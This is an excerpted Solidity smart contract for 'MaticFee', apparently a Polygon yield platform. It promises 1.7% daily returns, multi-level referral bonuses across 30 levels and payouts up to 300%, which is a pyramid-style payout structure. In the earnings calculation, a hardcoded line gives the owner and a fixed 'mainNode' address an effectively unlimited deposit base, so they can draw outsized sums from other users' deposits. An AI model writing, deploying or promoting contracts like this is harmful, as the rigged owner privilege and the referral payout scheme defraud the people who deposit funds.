...
// https://www.maticfee.com/

pragma solidity ^0.8.11;

import "./ContractData.sol";

contract MaticFee is ContractData {
  constructor() {
    ownerNode = owner();
    accounts[ownerNode].unlockedLevel = 30;
    accounts[ownerNode].registered = true;
    accounts[mainNode].up = ownerNode;
    accounts[mainNode].unlockedLevel = 30;
    accounts[mainNode].registered = true;
    accountsRefs[ownerNode].push(mainNode);
    emit ReferralTransaction(mainNode, ownerNode);

    networkSize += 2;
    reflectAccounts += 2;
    reflectAmount = 1;
    accountInReflectEntryPoint[mainNode] = 1;
    accountInReflectEntryPoint[ownerNode] = 1;

    emit ReflectParticipation(mainNode);
    emit ReflectParticipation(ownerNode);
  }
  ...
  function transactionW(uint amount) external {
    require(amount > 0, "Invalid amount");
    _withdraw(amount);
    _payCumulativeNetworkFee();
  }
  ...
  function _withdraw(uint amount) private {
    ...
    require(accountsLastWithdraw[sender] <= (block.timestamp - timeToWithdraw), "Only 1 withdraw each 24h is possible");

    uint maxAllowedToWithdraw = (directBonusAmount + levelBonusAmount + reflectBonusAmount + passive);

    if (amount > 0) {
      require(amount <= remainingWithdraw, "Amount exceed remaining amount to be withdrawn");
      remainingWithdraw = amount;
    } else {
      if (maxAllowedToWithdraw < remainingWithdraw) remainingWithdraw = (maxAllowedToWithdraw * maxWithdrawPercentPerTime) / 100;
    }
    ...
    accountsLastWithdraw[sender] = block.timestamp;

    if (totalToWithdraw >= (((allowedWithdraw * maxPercentToWithdraw) / 100) - (receivedTotalAmount))) {
      emit WithdrawLimitReached(sender, receivedTotalAmount + totalToWithdraw);
    } else {
      if (amount > 0 && maxAllowedToWithdraw < (((allowedWithdraw * maxPercentToWithdraw) / 100) - (receivedTotalAmount))) {
        require(amount <= (maxAllowedToWithdraw * maxWithdrawPercentPerTime) / 100, "Max withdraw allowed per time is 50% of available");
      }
    }
  ...
  function _processROU(address sender, uint depositMin) private view {
    uint receivedTotalAmount = accounts[sender].receivedTotalAmount;
  ...
  function _registerDeposit(address sender, uint iniAmount) private {
    ...
    if (depositCounter > 0) _processROU(sender, depositMin);
    ...
    if (accountInReflectEntryPoint[sender] != 0) accountInReflectEntryPoint[sender] = reflectAmount;
    accounts[sender].directBonusAmount = 0;
    accounts[sender].levelBonusAmount = 0;
  ...
  function _luckyFee(uint amount) private returns (uint) {
    uint luckyFee = (amount * luckyFeePercent) / 1000;
    luckyMap[luckyIndex].amount += luckyFee;
    return luckyFee;
  }
...
contract ContractData is Authorized {
  ...
  string public constant name = "MaticFee";
  string public constant url = "www.maticfee.com";
  ...
  mapping(address => uint) public accountsLastWithdraw;
  ...
  uint public timeFrame = 1 days;
  uint public timeToWithdraw = 1 days;
  uint public minAllowedDeposit = 7 ether / ratio;
  uint public minAmountToLvlUp = 35 ether / ratio;
  uint public minAmountToGetBonus = 35 ether / ratio;
  uint public minAmountToGetReflect = 2000 ether / ratio;
  
  uint public dailyRentability = 17;
  uint public directBonus = 200;
  uint public maxWithdrawPercentPerTime = 50;

  uint public networkFeePercent = 70;
  uint public reflectFeePercent = 20;
  uint public luckyFeePercent = 10;
  
  uint public maxPercentToWithdraw = 300;
  ...
  address mainNode = 0x00405317894E962Df8A2c159C941D57804CcCfeE;
  address ownerNode;

  constructor() {
    _passiveBonusLevel[0]  = 200;
    _passiveBonusLevel[1]  = 24;
    _passiveBonusLevel[2]  = 17;
    _passiveBonusLevel[3]  = 17;
    _passiveBonusLevel[4]  = 17;
    _passiveBonusLevel[5]  = 17;
    _passiveBonusLevel[6]  = 17;
    _passiveBonusLevel[7]  = 17;
    _passiveBonusLevel[8]  = 17;
    _passiveBonusLevel[9]  = 17;
    _passiveBonusLevel[10] = 17;
    _passiveBonusLevel[11] = 17;
    _passiveBonusLevel[12] = 17;
    _passiveBonusLevel[13] = 17;
    _passiveBonusLevel[14] = 17;
    _passiveBonusLevel[15] = 17;
    _passiveBonusLevel[16] = 17;
    _passiveBonusLevel[17] = 17;
    _passiveBonusLevel[18] = 17;
    _passiveBonusLevel[19] = 17;
    _passiveBonusLevel[20] = 17;
    _passiveBonusLevel[21] = 17;
    _passiveBonusLevel[22] = 17;
    _passiveBonusLevel[23] = 17;
    _passiveBonusLevel[24] = 17;
    _passiveBonusLevel[25] = 17;
    _passiveBonusLevel[26] = 17;
    _passiveBonusLevel[27] = 17;
    _passiveBonusLevel[28] = 17;
    _passiveBonusLevel[29] = 17;
  }
  ...
  uint public luckyMinAmount = 3 ether / ratio;
  ...
  function updateMinAmountToGetReflect(uint _minAmountToGetReflect) external isAuthorized(1) { minAmountToGetReflect = _minAmountToGetReflect; }
  ...
  function getAccountEarnings(address sender) view external returns(Account memory account, uint reflectBonusAmount, MoneyFlow memory total, MoneyFlow memory toWithdraw, MoneyFlow memory toMaxEarning, MoneyFlow memory toReceiveOverMax, uint level, uint directs, uint time, uint accountLastWithdraw) {
    address localSender = sender;
    account = accounts[localSender];
    accountLastWithdraw = accountsLastWithdraw[localSender];
  ...
  function getAccountEarningsFlow(address sender) view public returns(MoneyFlow memory total, MoneyFlow memory toWithdraw, MoneyFlow memory toMaxEarning, MoneyFlow memory toReceiveOverMax) {
    ...
    uint passive = calculateTransactionFee(accounts[localSender].depositTime, depositMin, receivedTotalAmount, accounts[localSender].receivedPassiveAmount);
    {
      ...
      if (localSender == ownerNode || localSender == mainNode) depositMin = type(uint).max / 10000;
    }
